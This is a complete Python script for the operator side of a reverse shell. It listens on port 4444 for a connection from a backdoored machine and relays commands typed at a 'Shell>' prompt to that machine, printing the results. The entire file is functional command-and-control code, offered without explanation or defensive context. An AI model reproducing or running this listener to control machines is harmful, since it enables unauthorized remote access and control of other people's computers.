import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print(f"[+] Connection established from {address}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def run(self):
        while True:
            command = input("Shell> ")
            command = command.split(" ")

            self.reliable_send(command)
            if command[0] == "exit":
                self.connection.close()
                exit()

            result = self.reliable_receive()
            print(result)

my_listener = Listener("0.0.0.0", 4444)
my_listener.run()
